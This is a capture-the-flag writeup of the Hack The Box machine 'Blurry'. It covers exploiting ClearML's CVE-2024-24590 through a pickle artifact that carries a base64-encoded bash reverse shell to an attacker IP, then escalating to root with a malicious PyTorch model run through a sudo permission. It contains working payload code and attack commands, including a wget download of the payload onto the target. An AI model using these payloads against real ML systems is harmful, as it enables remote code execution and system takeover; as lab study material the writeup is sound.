---
layout: post
title: HTB Blurry - writeup
date: 2024-11-03
categories: [blog]
tags: [ai, ctf]
---

Machine learning is a relatively new field, and its security — particularly on the offensive side — offers a fascinating area for exploration.

Blurry is a medium difficulty challenge on Hack The Box. It explores the field of ML development life cycle in terms of security. This challenge prompts the attacker to research machine learning concepts to root the machine.

![](/assets/images/htb_blurry/banner.webp)

## Recon

### Port scan

```
22/tcp open ssh OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
80/tcp open http nginx 1.18.0
```

### Web

Port 80 (domain `app.blurry.htb`) is hosting **ClearML**, an open source web application for managing and scaling machine learning workflows. It provides a suite of tools for experiment tracking, data management, model training orchestration, and deployment.

#### Exploit research

I found out that ClearML is vulnerable to an RCE ([CVE-2024–24590](https://nvd.nist.gov/vuln/detail/CVE-2024-24590)).

The [exploit](https://github.com/xffsec/CVE-2024-24590-ClearML-RCE-Exploit) takes advantage of the ability to execute code through `pickle`, a library used to store machine learning models that can later be loaded as needed.

The exploit core resides in the `exploit` function, below the most interesting lines with explanatory comments.

```python
# [redacted]
# encoding the "bash -i" reverse shell in bas64
bash_cmd = f'bash -c "bash -i >& /dev/tcp/{local_ip}/{local_port} 0>&1"'
base64_cmd = encode_base64(bash_cmd)
# declaring the payload that will be executed decoding the previous reverse shell command and executing it
cmd = f'echo {base64_cmd} | base64 -d | sh'
# [redacted]
# declaring the exploit class that will be serialized into a picke artifact
class exploit:
        def __reduce__(self):
            return os.system, (cmd,)
# [redacted]
# initialize the Task for the specified project
task = Task.init(project_name=project_name, task_name='exploit', tags=["review"], output_uri=True)
# uploading the malicious artifact
task.upload_artifact(name='pickle_artifact', artifact_object=exploit(), retries=2, wait_on_upload=True)
# [redacted]
```

## Exploiting the RCE

First, I downloaded the PoC, created a virtual environment and installed the requirements.

```sh
wget https://github.com/xffsec/CVE-2024-24590-ClearML-RCE-Exploit/raw/refs/heads/main/exploit.py
virtualenv venv
source venv/bin/activate
pip install clearml colorama
# feel free to install pwntools if you need
# I started a listener with nc by myself and commented out "from pwn import *"
python3 exploit.py
```

The first thing to do is initializing the ClearML client (*option 1*). The script will execute `clearml-init` to create a config file containing the Access and Secret keys, needed to connect to the ClearML server.

[This article](https://medium.com/@a0922/introduction-to-clearml-executing-in-google-colab-5485768cf6e9) explains how to generate a pair of keys.

I immediately faced an error:

    Retrying (Retry(total=0, connect=None, read=None, redirect=None, status=None)) after connection broken by ‘NameResolutionError(“<urllib3.connection.HTTPConnection object at 0x7f158715c0e0>: Failed to resolve ‘api.blurry.htb’ ([Errno -2] Name or service not known)”)’: /auth.login

This is caused by the fact that `clearml-init` calls the subdomain api.blurry.htb, so it must be added to the `/etc/hosts`. I also added files.blurry.htb: it will be needed later to upload the malicious model.

In order to make the exploit work, it is necessary that the pickle artifact is executed by someone. In this case, there’s a scheduled task in ClearML, called “*Review JSON Artifacts*”, that reviews all the artifacts uploaded on every new task in the “Black Swan” project.

![](/assets/images/htb_blurry/htb_blurry_clearml.webp)

When the exploit script asks for the project name, it is necessary to enter “Black Swan”. Also note that when you upload a new task, it is marked as “review” (tagged by the exploit itself when uploading it to ClearML).

![](/assets/images/htb_blurry/htb_blurry_newtask.webp)

This is important because the review task only reviews artifacts with that tag:

``` python
# Retrieve tasks tagged for review
tasks = Task.get_tasks(project_name='Black Swan', tags=["review"], allow_archived=False)
```

After config initialization, the script is ready to generate a malicious model, converting it to a pickle artifact and uploading it to the server.

```sh
$ python3 exploit.py

CVE-2024-24590 - ClearML RCE
============================
[1] Initialize ClearML
[2] Run exploit
[0] Exit
[>] Choose an option: 2
[+] Your IP: <IP>                               
[+] Your Port: <PORT>
[+] Target Project name Case Sensitive!: Black Swan
```

After the review of the malicious artifact, I gained a shell as jippity.

## Escalating privileges with a PyTorch model

User jippity have the following permission in the sudoers file.


    (root) NOPASSWD: /usr/bin/evaluate_model /models/*.pth

`evaluate_model` is a bash script that, surprisingly, evaluates ML models.

The scripts also makes some strange security checks with another custom script written in Python: `/usr/local/bin/fickling`.

```python
#!/usr/bin/python3
# -*- coding: utf-8 -*-
import re
import sys
from fickling.__main__ import main
if __name__ == '__main__':
    sys.argv[0] = re.sub(r'(-script\.pyw|\.exe)?$', '', sys.argv[0])
    sys.exit(main())
```

This script removes certain suffixes (`-script.pyw` and `.exe`) from the name of the script that is being executed. Given the poor security check, I thought I should apply what I learned before and create another malicious model, this time a PyTorch one. [Here](https://github.com/duck-sec/pytorch-evil-pth) is a script that generates a malicious pth file.

Installation and usage:

```sh
wget https://raw.githubusercontent.com/duck-sec/pytorch-evil-pth/refs/heads/master/evil_pth.py
virtualenv venv
source venv/bin/activate
# this the extra index url flag will prevent pip from installing the nvidia GPU support packets (not needed)
pip install torch --extra-index-url https://download.pytorch.org/whl/cpu
python3 evil_pth.py "/bin/bash -p"
```

The script generated a PyTorch malicious model that will execute the command `/bin/bash -p`as root, providing a privileged shell when evaluated.

Finally, I downloaded the malicious model on the target and exploited the vulnerable SUDO permissions.

```sh
# on my host
python3 -m http.server 80

# on the target
cd /model
wget http://10.10.10.10/evil_model.pth
sudo /usr/bin/evaluate_model /models/evil_model.pth
```

The exploit worked and returned a shell as root.

![](/assets/images/htb_blurry/htb_blurry_privesc.webp)

